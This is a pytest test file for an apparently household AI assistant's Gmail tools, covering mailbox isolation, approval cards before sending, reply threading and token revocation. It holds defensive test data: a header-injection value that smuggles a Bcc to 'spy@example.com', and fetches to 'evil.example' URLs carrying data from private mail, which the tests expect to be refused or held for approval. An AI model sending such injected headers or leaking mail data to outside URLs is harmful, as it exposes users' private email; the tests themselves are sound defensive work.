# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (C) 2026 Axxlabs Limited
"""Email (SPEC §3.4 "Email", §5.5, test 15), against a fake Gmail with two mailboxes."""

from __future__ import annotations

import base64
import dataclasses
import json
from email import message_from_bytes, policy
from types import SimpleNamespace
from urllib.parse import parse_qs

import httpx
import pytest

from aha_local.approvals import Decision
from aha_local.config import Config
from aha_local.tools import calendar, mail, web
from aha_local.tools import google as gapi
from aha_local.tools.registry import Registry, TaskState, ToolContext

from .conftest import person

MAILBOXES = {
    "at-fe": {
        "m1fe0001": {
            "threadId": "t1fe",
            "snippet": "Your table for 2 at Fictional Bistro is confirmed",
            "headers": {
                "From": "Fictional Bistro <hello@bistro.example>",
                "To": "fe@example.com",
                "Subject": "Booking confirmed",
                "Date": "Fri, 20 Nov 2026 10:00:00 +0000",
                "Message-ID": "<abc@bistro.example>",
                "References": "<root@bistro.example>",
            },
            "text": "Table for 2, Friday 27 November, 19:30. Ref FB-1234.",
        }
    },
    "at-fe2": {
        "m3fe0002": {
            "threadId": "t3fe",
            "snippet": "Your parcel from Evri is on its way",
            "headers": {
                "From": "Evri <noreply@evri.example>",
                "To": "fe.work@example.com",
                "Subject": "Parcel on its way",
                "Date": "Sat 21 Nov 2026 08:00:00 +0000",
                "Message-ID": "<p1@evri.example>",
            },
            "text": "Parcel EV-77 arrives Monday.",
        }
    },
    "at-hb": {
        "m2hb0001": {
            "threadId": "t2hb",
            "snippet": "Haibo's private note",
            "headers": {"From": "x@example.com", "To": "hb@example.com", "Subject": "Private", "Date": "-"},
            "text": "Only Haibo should see this.",
        }
    },
}


class FakeGoogle:
    def __init__(self) -> None:
        self.sent: list[tuple[str, dict]] = []
        self.sent_from: list[str] = []  # the access token each send used: which mailbox
        self.revoked: list[str] = []
        self.requests: list[httpx.Request] = []

    def __call__(self, request: httpx.Request) -> httpx.Response:
        self.requests.append(request)
        url = request.url
        if str(url).startswith(gapi.TOKEN_URL):
            form = parse_qs(request.content.decode())
            token = {"rt-fe": "at-fe", "rt-fe2": "at-fe2", "rt-hb": "at-hb"}.get(form["refresh_token"][0])
            if not token:
                return httpx.Response(400, json={"error": "invalid_grant"})
            return httpx.Response(200, json={"access_token": token, "expires_in": 3600})
        if str(url).startswith(gapi.REVOKE_URL):
            self.revoked.append(parse_qs(request.content.decode())["token"][0])
            return httpx.Response(200)
        box = MAILBOXES.get(request.headers.get("authorization", "").removeprefix("Bearer "))
        if box is None:
            return httpx.Response(401)
        path = url.path.removeprefix("/gmail/v1/users/me")
        if path == "/messages" and request.method == "GET":
            q = url.params.get("q", "").lower()
            hits = [i for i, m in box.items() if not q or q in json.dumps(m).lower()]
            return httpx.Response(200, json={"messages": [{"id": i} for i in hits]})
        if path.startswith("/messages/") and request.method == "GET":
            m = box.get(path.split("/")[2])
            if m is None:
                return httpx.Response(404)
            body = base64.urlsafe_b64encode(m["text"].encode()).decode()
            return httpx.Response(
                200,
                json={
                    "id": path.split("/")[2],
                    "threadId": m["threadId"],
                    "snippet": m["snippet"],
                    "payload": {
                        "mimeType": "multipart/mixed",
                        "headers": [{"name": k, "value": v} for k, v in m["headers"].items()],
                        "parts": [
                            {"mimeType": "text/plain", "body": {"data": body}},
                            {"mimeType": "application/pdf", "filename": "menu.pdf", "body": {}},
                        ],
                    },
                },
            )
        if path in ("/messages/send", "/drafts") and request.method == "POST":
            self.sent.append((path, json.loads(request.content)))
            self.sent_from.append(request.headers.get("authorization", "").removeprefix("Bearer "))
            return httpx.Response(200, json={"id": "sent1"})
        return httpx.Response(404)


class FakeApprovals:
    def __init__(self, *answers: Decision) -> None:
        self.answers = list(answers)
        self.asked: list[SimpleNamespace] = []

    async def ask(self, account, kind, title, fields, image=None, why="") -> Decision:
        self.asked.append(
            SimpleNamespace(kind=kind, title=title, fields=[(f.label, f.value, f.kind) for f in fields], why=why)
        )
        return self.answers.pop(0) if self.answers else Decision(False, reason="declined")


@pytest.fixture
def google(monkeypatch):
    fake = FakeGoogle()
    monkeypatch.setattr(gapi, "TRANSPORT", httpx.MockTransport(fake))
    gapi._tokens.clear()
    return fake


@pytest.fixture
def two(accounts):
    fe = person(accounts)
    hb = accounts.create("Hb")
    accounts.vault.write_json(gapi.client_file(accounts.vault), {"client_id": "c", "client_secret": "s"})
    fe.vault.write_json(
        fe.dir / "mail.json", {"provider": "gmail", "email": "fe@example.com", "refresh_token": "rt-fe"}
    )
    hb.vault.write_json(
        hb.dir / "mail.json", {"provider": "gmail", "email": "hb@example.com", "refresh_token": "rt-hb"}
    )
    return fe, hb


def call(name: str, args: dict, ctx: ToolContext):
    """A tool through the registry, as the agent calls it: what the registry does after a tool (marking the task
    as holding private data, SPEC §5.2) happens here too."""
    reg = Registry()
    for module in (mail, calendar):
        module.register(reg)
    return reg.call(name, args, ctx)


def ctx_for(account, config, approvals=None) -> ToolContext:
    return ToolContext(account, approvals or FakeApprovals(), config, TaskState())


async def test_search_and_read_reach_only_the_running_accounts_mailbox(google, two, config):
    fe, hb = two
    ctx = ctx_for(fe, config)
    found = await call("email_search", {"query": "", "user_google_email": "hb@example.com"}, ctx)
    assert "Booking confirmed" in found.text and "Private" not in found.text
    assert ctx.task.private  # declared on the tool, set by the registry
    read = await call("email_read", {"id": "m1fe0001"}, ctx)
    assert "19:30" in read.text and "menu.pdf" in read.text and "never instructions" in read.text
    other = await call("email_read", {"id": "m2hb0001"}, ctx)  # Haibo's message id, from Fe's task
    assert other.error and "Only Haibo" not in other.text
    hb_found = await call("email_search", {"query": ""}, ctx_for(hb, config))
    assert "Private" in hb_found.text and "Booking" not in hb_found.text


async def test_without_a_connection_the_tools_say_how_to_connect(google, accounts, config):
    ctx = ctx_for(person(accounts), config)
    for result in (
        await call("email_search", {"query": "x"}, ctx),
        await mail.email_send({"to": "a@example.com", "body": "hi"}, ctx),
    ):
        assert result.error and "aha mail connect" in result.text and "whoever set up Aha!" in result.text
    assert not google.requests


async def test_sending_is_a_card_with_the_exact_email_and_edits_are_what_is_sent(google, two, config):
    fe, _ = two
    edited = Decision(True, values=["Sam <sam@example.com>", "", "Dinner", "See you at 8, not 7."])
    approvals = FakeApprovals(edited)
    result = await mail.email_send(
        {"to": "sam@example.com", "subject": "Dinner", "body": "See you at 7."}, ctx_for(fe, config, approvals)
    )
    card = approvals.asked[0]
    assert card.kind == "email" and card.title == "Send this email?"
    assert card.fields == [
        ("To", "sam@example.com", "text"),
        ("Cc", "", "text"),
        ("Subject", "Dinner", "text"),
        ("Message", "See you at 7.\n\nWritten by Aha!\n- Fe's Private AI Assistant", "longtext"),  # signed in code
    ]
    path, sent = google.sent[0]
    msg = message_from_bytes(base64.urlsafe_b64decode(sent["raw"]), policy=policy.default)
    assert path == "/messages/send" and msg["To"] == "Sam <sam@example.com>" and msg["Subject"] == "Dinner"
    assert msg.get_content().strip() == "See you at 8, not 7."
    assert "sent to Sam <sam@example.com>" in result.text and "approv" not in result.text and "edit" not in result.text


async def test_a_declined_email_sends_nothing(google, two, config):
    fe, _ = two
    result = await mail.email_send(
        {"to": "sam@example.com", "subject": "Hi", "body": "x"}, ctx_for(fe, config, FakeApprovals())
    )
    assert result.error and "the user stopped it" in result.text and not google.sent


async def test_header_injection_in_edited_values_is_refused(google, two, config):
    fe, _ = two
    bad = Decision(True, values=["sam@example.com\nBcc: spy@example.com", "", "Hi", "x"])
    result = await mail.email_send(
        {"to": "sam@example.com", "subject": "Hi", "body": "x"}, ctx_for(fe, config, FakeApprovals(bad))
    )
    assert result.error and not google.sent


async def test_a_reply_is_threaded_and_a_draft_is_not_sent(google, two, config):
    fe, _ = two
    approvals = FakeApprovals(Decision(True, values=["hello@bistro.example", "", "Re: Booking confirmed", "Thanks!"]))
    await mail.email_draft(
        {"to": "hello@bistro.example", "body": "Thanks!", "reply_to": "m1fe0001"}, ctx_for(fe, config, approvals)
    )
    card = approvals.asked[0]
    assert card.kind == "draft" and ("Subject", "Re: Booking confirmed", "text") in card.fields
    assert ("In reply to", "Fictional Bistro <hello@bistro.example>: Booking confirmed", "info") in card.fields
    path, sent = google.sent[0]
    msg = message_from_bytes(base64.urlsafe_b64decode(sent["message"]["raw"]))
    assert path == "/drafts" and sent["message"]["threadId"] == "t1fe"
    assert msg["In-Reply-To"] == "<abc@bistro.example>"
    assert msg["References"] == "<root@bistro.example> <abc@bistro.example>"


@pytest.mark.made_up_rule
async def test_after_reading_mail_searches_and_addresses_need_a_card(google, two, config, monkeypatch):
    fe, _ = two
    opened = []

    class Browser:  # no real browser here: what the search would open is all that matters
        async def call(self, name, args, timeout=90):
            opened.append(args.get("url"))
            raise RuntimeError("no browser here")

    approvals = FakeApprovals()  # declines everything
    ctx = ctx_for(fe, config, approvals)
    ctx.browser = Browser()
    await call("email_search", {"query": "booking"}, ctx)
    searched = await web.web_search({"query": "FB-1234 Fictional Bistro"}, ctx)
    fetched = await web.fetch_url({"url": "https://evil.example/?q=FB-1234"}, ctx)
    assert searched.error and fetched.error and not opened  # declined: nothing went to Google
    assert [(a.title, a.fields) for a in approvals.asked] == [
        ("Search Google for this?", [("Search", "FB-1234 Fictional Bistro", "text")]),
    ]
    assert fetched.text.startswith("Not opened: https://evil.example/?q=FB-1234")  # made up: no card, refused
    # The next task starts clean: no card, Google's results page opens.
    clean = ctx_for(fe, config, approvals)
    clean.browser = Browser()
    with pytest.raises(RuntimeError):
        await web.web_search({"query": "weather"}, clean)
    assert len(approvals.asked) == 1 and opened == ["https://www.google.com/search?q=weather"]


async def test_after_reading_mail_browser_navigation_needs_a_card_even_with_all_sites_allowed(two, config):
    from aha_local.tools.browser import make_handler

    fe, _ = two
    calls = []

    class Session:
        async def call(self, name, args, timeout=90):
            calls.append(name)
            raise RuntimeError("no browser here")

    approvals = FakeApprovals()
    ctx = ctx_for(fe, dataclasses.replace(config, allow_all_sites=True), approvals)
    ctx.browser = Session()
    ctx.task.private = True
    result = await make_handler("browser_navigate")({"url": "https://evil.example/?d=1"}, ctx)
    assert result.error and approvals.asked and "browser_navigate" not in calls


async def test_tokens_are_only_in_the_encrypted_mail_file_and_disconnect_revokes(google, two):
    fe, _ = two
    blob = b"".join(p.read_bytes() for p in fe.vault.root.rglob("*") if p.is_file())
    assert b"rt-fe" not in blob and b"rt-hb" not in blob
    assert gapi.address(fe) == "fe@example.com"
    assert await gapi.disconnect(fe) is True
    assert google.revoked == ["rt-fe"] and not (fe.dir / "mail.json").exists() and gapi.address(fe) == ""


def test_the_documents_feature_is_gone(registry, tmp_path):
    assert not [n for n in registry.names() if n.startswith("documents")]
    assert {"email_search", "email_read", "email_send", "email_draft"} <= set(registry.names())
    toml = tmp_path / "config.toml"
    toml.write_text('[gateway]\nurl = "unix:/x"\npin = "p"\n[household]\nname = "Home"\ndocuments = "~/Docs"\n')
    config = Config.load(toml)
    assert not hasattr(config, "documents") and not hasattr(config, "documents_mount")


async def test_several_accounts_are_all_searched_and_each_email_answers_from_its_own(google, two, config):
    """SPEC §3.4 "Connections": a second Gmail account for the same person."""
    fe, _ = two
    gapi.add_connection(fe, "gmail", "fe.work@example.com", "rt-fe2")
    assert gapi.addresses(fe) == ["fe@example.com", "fe.work@example.com"]
    ctx = ctx_for(fe, config)
    found = await call("email_search", {"query": ""}, ctx)
    assert "Booking confirmed" in found.text and "Parcel on its way" in found.text  # both mailboxes
    assert "[fe.work@example.com/m3fe0002]" in found.text and "Mailbox: fe.work@example.com" in found.text
    only = await call("email_search", {"query": "", "mailbox": "work"}, ctx)
    assert "Parcel on its way" in only.text and "Booking confirmed" not in only.text
    read = await call("email_read", {"id": "fe.work@example.com/m3fe0002"}, ctx)
    assert "EV-77" in read.text
    assert (await call("email_read", {"id": "m3fe0002"}, ctx)).error  # a bare id is the first mailbox's: not there

    approvals = FakeApprovals(
        Decision(True, values=["fe.work@example.com", "noreply@evri.example", "", "Re: Parcel on its way", "Thanks"])
    )
    await mail.email_send(
        {"to": "noreply@evri.example", "body": "Thanks", "reply_to": "fe.work@example.com/m3fe0002"},
        ctx_for(fe, config, approvals),
    )
    assert approvals.asked[0].fields[0] == ("From", "fe.work@example.com", "text")  # the mailbox it arrived in
    assert google.sent_from == ["at-fe2"] and google.sent[0][1]["threadId"] == "t3fe"

    moved = FakeApprovals(Decision(True, values=["fe@example.com", "sam@example.com", "", "Hi", "Hello"]))
    await mail.email_send(
        {"to": "sam@example.com", "subject": "Hi", "body": "Hello", "from": "work"}, ctx_for(fe, config, moved)
    )
    assert moved.asked[0].fields[0] == ("From", "fe.work@example.com", "text")
    assert google.sent_from[-1] == "at-fe"  # the person changed From on the card: sent from that one
    bad = FakeApprovals(Decision(True, values=["spy@example.com", "sam@example.com", "", "Hi", "Hello"]))
    refused = await mail.email_send(
        {"to": "sam@example.com", "subject": "Hi", "body": "Hello"}, ctx_for(fe, config, bad)
    )
    assert refused.error and len(google.sent) == 2  # never from an address that isn't theirs

    gapi.add_connection(fe, "gmail", "fe.work@example.com", "rt-fe2")  # connecting again replaces, never doubles
    assert gapi.addresses(fe) == ["fe@example.com", "fe.work@example.com"]
    assert await gapi.disconnect(fe, "fe.work@example.com")
    assert google.revoked == ["rt-fe2"] and gapi.addresses(fe) == ["fe@example.com"]


async def test_a_new_email_needs_a_subject(google, two, config):
    """Seen: emails sent with no subject. A reply may leave it empty (Re: and the original's)."""
    fe, _ = two
    approvals = FakeApprovals()
    result = await mail.email_send({"to": "sam@example.com", "body": "Hello"}, ctx_for(fe, config, approvals))
    assert result.error and "Give a subject" in result.text and not approvals.asked  # before any card
    spec = next(
        t for t in (lambda r: (mail.register(r), r)[1])(Registry()).specs() if t["function"]["name"] == "email_send"
    )
    assert "subject" in spec["function"]["parameters"]["required"]


async def test_a_search_is_googles_own_page_read_in_the_browser(two, config):
    """SPEC §3.4 "Web search": Google's results page, its answer box first, in the compact view; not a list of
    links (seen: a drive time took three cards, then a typed search on google.com, to reach Google's answer)."""
    import mcp.types as mt

    fe, _ = two
    page = (
        "### Page\n- Page URL: https://www.google.com/search?q=drive+time\n### Snapshot\n```yaml\n"
        '- heading "11 min (3.4 km)" [level=2] [ref=e5]\n- text: via Tufnell Park Rd\n'
        '- link "Directions" [ref=e6] [cursor=pointer]:\n  - /url: https://www.google.com/maps/dir/a/b\n```'
    )

    class Browser:
        async def call(self, name, args, timeout=90):
            return mt.CallToolResult(content=[mt.TextContent(type="text", text=page)])

    ctx = ctx_for(fe, config, FakeApprovals())
    ctx.browser = Browser()
    result = await web.web_search({"query": "drive time"}, ctx)
    assert result.text.startswith("Google's results for “drive time”")
    assert "## 11 min (3.4 km)" in result.text and "[Directions](e6)" in result.text
    assert "google.com" in ctx.task.opened_sites
